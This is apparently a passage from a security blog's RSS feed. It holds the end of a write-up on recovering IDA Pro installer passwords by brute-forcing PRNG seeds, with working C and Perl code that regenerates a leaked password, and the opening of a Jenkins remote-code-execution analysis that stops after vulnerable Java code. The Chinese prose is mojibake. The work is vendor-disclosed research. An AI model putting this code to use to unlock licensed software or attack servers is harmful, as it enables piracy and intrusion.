        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¤§ç´„ä¸€å€‹æœˆçš„é‹ç®—ï¼Œæˆ‘å€‘çµ‚æ–¼æˆåŠŸåˆ©ç”¨ Perl äº‚æ•¸ç”¢ç”Ÿå‡º IDA Pro çš„å®‰è£å¯†ç¢¼ï¼Œè€Œæ­£ç¢ºçš„å­—å…ƒçµ„é †åºç‚º &lt;code class=&quot;highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;ã€‚ä¾‹å¦‚ hacking team æ´©æ¼çš„ IDA Pro 6.8 å®‰è£å¯†ç¢¼æ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt;ï¼Œå°±å¯ç”¨ä¸‹é¢ç¨‹å¼ç¢¼ç”¢ç”Ÿï¼š&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$i $pw\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€éé€™äº›è³‡è¨Šï¼Œæˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€å€‹ç”¨ä¾†æš´åŠ›åˆ—èˆ‰å®‰è£å¯†ç¢¼çš„å­—å…¸æª”ï¼Œç¸®çŸ­æš´åŠ›åˆ—èˆ‰çš„æ™‚é–“ï¼Œå¯¦ä½œæ–¹å¼å¯åƒè€ƒ &lt;a href=&quot;https://github.com/kholia/inno2john&quot;&gt;inno2john&lt;/a&gt; å°ˆæ¡ˆã€‚åœ¨ä¸€èˆ¬æƒ…æ³ä¸‹ï¼Œç´„ååˆ†é˜å³å¯ç®—å‡º windows å®‰è£æª”çš„å®‰è£å¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨å›å ± Hex-Rays å¾Œï¼Œä»–å€‘ç«‹åˆ»è¡¨ç¤ºä¹‹å¾Œå°‡æœƒä½¿ç”¨æ›´å®‰å…¨çš„å®‰è£å¯†ç¢¼ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç¸½çµ&quot;&gt;ç¸½çµ&lt;/h2&gt;

&lt;p&gt;æœ¬ç¯‡æ–‡ç« æå‡ºäº†ä¸€å€‹é–‹æ”¾æ€§å•é¡Œï¼šåœ¨æœªçŸ¥å®‰è£å¯†ç¢¼çš„æƒ…æ³ä¸‹å¯ä¸å¯ä»¥å®‰è£ IDA Proï¼Ÿçµæœæˆ‘å€‘åœ¨ Linux ä»¥åŠ MacOS ç‰ˆç™¼ç¾å¯ä»¥å¾è¨˜æ†¶é«”ä¸­å–å¾—æ˜æ–‡å¯†ç¢¼ã€‚è€Œåœ¨ Windows ç‰ˆæœ¬ä¸­ï¼Œæˆ‘å€‘é»‘ç®±æ‰¾åˆ°äº†å®‰è£å¯†ç¢¼ç”¢ç”Ÿçš„æ–¹å¼ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€ä»½å­—å…¸æª”ï¼Œç”¨ä»¥ç¸®çŸ­æš´åŠ›åˆ—èˆ‰å®‰è£å¯†ç¢¼çš„æ™‚é–“ï¼Œæœ€çµ‚ï¼Œæˆ‘å€‘ç´„ååˆ†é˜å¯è§£å‡ºä¸€çµ„å¯†ç¢¼ï¼Œæ˜¯ä¸€å€‹å¯ä»¥æ¥å—çš„æ™‚é–“ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘çœŸçš„å¾ˆå–œæ­¡é€™æ¨£çš„éç¨‹ï¼šæœ‰æ ¹æ“šçš„å¤§è†½çŒœæ¸¬ï¼Œç«­ç›¡å…¨åŠ›ç”¨ä»»ä½•å·²çŸ¥è³‡è¨Šå»è­‰æ˜æˆ‘å€‘çš„æƒ³æ³•ï¼Œä¸è«–çŒœæ¸¬æ˜¯å°æ˜¯éŒ¯ï¼Œéƒ½èƒ½å¾éç¨‹ä¸­ç²å¾—å¾ˆå¤šç¶“é©—ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘é€™æ¬¡é¡˜æ„èŠ±ä¸€å€‹æœˆæ™‚é–“å»é©—è­‰ä¸€å€‹æˆåŠŸæ©Ÿç‡ä¸æ˜¯å¾ˆé«˜çš„å‡è¨­ã€‚é™„å¸¶ä¸€æï¼Œé€™æ¨£çš„æ…‹åº¦ï¼Œä¹Ÿè¢«é‹ç”¨åœ¨æˆ‘å€‘&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;ç´…éšŠæ¼”ç·´&lt;/a&gt;ä¸Šï¼Œæƒ³è¦è©¦è©¦å— :p&lt;/p&gt;

&lt;p&gt;å¯«åœ¨æœ€å¾Œï¼Œè¦æ„Ÿè¬ Hex-Rays å¾ˆå‹å–„ä¸”å¿«é€Ÿçš„å›æ‡‰ã€‚å³ä½¿é€™å€‹å•é¡Œä¸åŒ…å«åœ¨ &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt; è£¡é¢ï¼Œä»ç„¶æ…·æ…¨çš„è´ˆé€ Linux å’Œ MAC ç‰ˆ IDA åŠå‡ç´šåŸæœ‰ Windows ç‰ˆè‡³ IDA Proã€‚å†æ¬¡æ„Ÿè¬ã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - å‘ Hex-Rays å›å ±å¼±é»&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays èªªæ˜ä¹‹å¾Œæœƒå¢åŠ å®‰è£å¯†ç¢¼çš„å¼·åº¦ï¼Œä¸¦å”åŠ©é€šå ± BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock é‡‹å‡ºäº† InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hello everyone!&lt;/p&gt;

&lt;p&gt;This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check the following link to get some basis and see how vulnerable Jenkinsâ€™ dynamic routing is!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing&lt;br /&gt;
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)! Although we could bypass the first ACL, we still canâ€™t do much things :(&lt;/p&gt;

&lt;p&gt;After Jenkins released the &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;First, we start from the Jenkins Pipeline to explain &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt;! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)&lt;/p&gt;

&lt;p&gt;In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but itâ€™s too tough. So the easiest way is to reuse existing function and library!&lt;/p&gt;

&lt;p&gt;As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

